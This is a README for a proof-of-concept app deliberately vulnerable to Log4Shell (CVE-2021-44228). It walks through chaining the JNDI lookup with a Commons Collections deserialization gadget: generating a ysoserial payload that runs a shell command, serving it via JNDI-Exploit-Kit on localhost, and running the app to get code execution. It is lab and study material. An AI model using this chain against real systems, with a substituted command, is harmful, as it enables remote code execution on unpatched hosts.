## Description
**Basic POC of log4j CVE-2021-44228 originally forked from [LiveOverflow/log4shell](https://github.com/LiveOverflow/log4shell)**

POC application that can be used to see how log4j vulnerability can be combined with Java deserialization vulnerability to obtain RCE even with an updated version on Java.

The application uses a vulnerable version of log4j 2 core and also imports Apache Commons Collections, I refer you [here](https://github.com/frohoff/ysoserial#description) for a really great summary on how "gadget chains" can be used to obtain unsafe deserialization of objects which ultimately leads to Remote Code Execution.

## How to build

To build the application you will need [`maven`](https://maven.apache.org/what-is-maven.html), after you have installed it just run `mvn package` and the compiled .jar will be inside a folder named *target*.

At any point you can play with the source code by updating *src/main/java/HelloLog.java* and then recompile the project to test things out.

## How to use it

Of course you are free to test the application however you want, I'll just show one simple way of doing it:

**NOTE: If you encounter problems try to change the default java version used by your system, in Ubuntu/Linux you can use `update-alternatives --config java`, for the following steps I'll be using java-8-openjdk**

1. First we'll clone or download [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) and [pimps/JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)
2. Inside the ysoserial-modified folder we generate the serialized payload with the following command `java -jar target/ysoserial-modified.jar CommonsCollections6 bash 'mkdir /tmp/pwned' > payload.ser`. *mkidr /tmp/pwned* can be substituted with your own command
3. Move the generated *payload.ser* file inside the JNDI-Exploit-Kit folder
4. Inside the JNDI-Exploit-Kit folder we start the tool executing `java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L 127.0.0.1:1389 -P payload.ser`. For a comprehensive documentation refer to the official repository
5. The vulnerable poc app is already set to call the custom payload end point generated by the jndi exploit kit so inside the vulnerable poc app folder you just need to execute `java -jar target/log4shell-1.0-SNAPSHOT.jar`
6. Now if you cd inside */tmp* you should find a folder named *pwned* or see the results of your custom command

## References
* [Zero-Day Exploit Targeting Popular Java Library Log4j](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)
* [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228)
* [A JOURNEY FROM JNDI/LDAP
MANIPULATION TO REMOTE CODE
EXECUTION DREAM LAND](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [Serialization and deserialization in Java: explaining the Java deserialize vulnerability](https://snyk.io/blog/serialization-and-deserialization-in-java/)
* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified)
* [pimps/JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)
